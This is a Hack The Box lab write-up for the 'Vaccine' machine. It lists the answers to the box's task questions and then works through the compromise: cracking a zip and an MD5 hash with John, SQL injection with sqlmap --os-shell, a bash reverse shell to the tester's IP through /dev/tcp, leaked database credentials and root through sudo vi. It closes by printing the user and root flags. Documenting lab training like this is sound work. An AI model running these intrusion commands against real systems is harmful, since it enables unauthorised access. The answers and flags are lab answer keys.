# Vaccine

**Platform**: Hack The Box\
**Difficulty**: Very Easy\
**Date**: 2026-06-07\
**OS**: Linux\
**IP**: 10.129.61.200

# Machine Tasks

Task 1
 > Besides SSH and HTTP, what other service is hosted on this box?
`FTP`

Task 2
 > This service can be configured to allow login with any password for specific username. What is that username?
`anonymous`

Task 3
 > What is the name of the file downloaded over this service?
`backup.zip`

Task 4
 > What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?
`zip2john`

Task 5
 > What is the password for the admin user on the website?

First, we crack the hash for the password protected .zip file using John The Ripper.

```bash
$ john -w=/usr/share/wordlists/rockyou.txt backup_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2026-06-07 15:38) 14.28g/s 58514p/s 58514c/s 58514C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Using this password, we can now open the .zip file and read the `index.php` file that was extracted to find the password for the admin user.

```bash
$ unzip backup.zip
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css
  
$ cat index.php      
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
...
```
The admin password is transmitted using an MD5 hash. Using John again, we can crack this hash to get the answer to this task.

```bash
$ john -w=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
qwerty789        (?)     
1g 0:00:00:00 DONE (2026-06-07 15:47) 12.50g/s 1252Kp/s 1252Kc/s 1252KC/s roslin..pogimo
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Task 6
 > What option can be passed to sqlmap to try to get command execution via the sql injection?
`--os-shell`

Initial Notes:
 * URL includes `/dashboard.php?search=` parameter to search for items on webpage
 * searching for random items prompts no error
 
1. scanned all ports to determine running sql instance; none returned (filtered?)
2. tested for sql injection using single quote `'` character to prompt error
[sql_error.png]

Resource: [https://portswigger.net/web-security/sql-injection]

Command(s):
```bash
sqlmap --os-shell -u "http://10.129.61.200/dashboard.php?search='"
```

* Command unsuccessful- auth is required to access vulnerable URL, and `--os-shell` is invoked after running sqlmap
* Referred to writeup to determine:
	* BurpSuite or browser extension can be used to catch cookie
	
[burp_cookie.png]

```bash
sqlmap -u "http://10.129.61.200/dashboard.php?search=tst" --cookie="PHPSESSID=vnjal1oj5jm2dv079iiai5ls8u"
```

The command confirms the URL parameter is vulnerable to SQL injection.
We then run the command to spawn the shell.

```bash
sqlmap -u "http://10.129.61.200/dashboard.php?search=tst" --cookie="PHPSESSID=vnjal1oj5jm2dv079iiai5ls8u" --os-shell
```
We've successfully prompted a linux shell. 

Task 7
 > What program can the postgres user run as root using sudo?
`vi`

* Attempted to check permissions, but returning `No output`, shell needs to be stabilized.
* Check our IP using `ifconfig`
* Start netcat listenter on port 443:
 
```bash
sudo nc -lvnp 443
```
 
* Stabilize the shell with the following payload:

```bash
bash -c "bash -i >& /dev/tcp/10.10.16.211/443 0>&1"
```
* Check permissions `sudo -l` and prompts for password.
* Locate `user.txt` in `/var/lib/postgresql`:

```text
postgres@vaccine:/var/lib/postgresql/11$ cd ..  
postgres@vaccine:/var/lib/postgresql$ ls
11  user.txt
postgres@vaccine:/var/lib/postgresql$ cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
```

* Locate postgres user password in `/var/www/html/dashboard.php`, since the machine uses SQL and PHP the creds will be in cleartext.

```bash
if($_SESSION['login'] !== "true") {
          header("Location: index.php");
          die();
        }
        try {
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
        }
```
* The acquired credentials can be used to authenticate to the machine via SSH, where we can check for permissions and start finding paths to escalate privileges:

```bash
$ ssh postgres@$IP
The authenticity of host '10.129.61.200 (10.129.61.200)' can't be established.
ED25519 key fingerprint is: SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.129.61.200' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
postgres@10.129.61.200's password: 
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 08 Jun 2026 01:40:46 AM UTC

  System load:  0.04              Processes:             184
  Usage of /:   32.6% of 8.73GB   Users logged in:       0
  Memory usage: 20%               IP address for ens160: 10.129.61.200
  Swap usage:   0%


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

postgres@vaccine:~$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

```

* we can edit the pg_hba.conf file using vi using GTFOBins
[https://gtfobins.github.io/gtfobins/vi/#sudo]

```text
$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
[sudo] password for postgres: 

# whoami
root
# ls
html
# cd html
# ls
bg.png  dashboard.css  dashboard.js  dashboard.php  index.php  license.txt  style.css
# cd ..
# ls
html
# cd ..
# ls
backups  cache  crash  ftp  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
# cd backups
# ls
apt.extended_states.0     apt.extended_states.2.gz  apt.extended_states.4.gz
apt.extended_states.1.gz  apt.extended_states.3.gz
# cd ..
# cd ..
# ls
bin   cdrom  etc   initrd.img      lib    lib64   lost+found  mnt  proc  run   snap  sys  usr  vmlinuz
boot  dev    home  initrd.img.old  lib32  libx32  media       opt  root  sbin  srv   tmp  var  vmlinuz.old
# cd root
# ls
pg_hba.conf  root.txt  snap
# cat root.txt
dd6e058e814260bc70e9bbdef2715849
#
```

---

# Flags

#### User
```text
ec9b13ca4d6229cd5cc1e09980965bf7
```

#### Root/Admin
```text
dd6e058e814260bc70e9bbdef2715849
```

---

# Lessons Learned

**Key takeaways**: 
 * Take breaks 
 * Research, research, and research what you are doing

**Enumeration lesson**:\

**Missed clues**: 
 * SQL Injection in URL param
 * Utilizing man pages for tips on commands
 * Referred
**New/Useful Commands**:
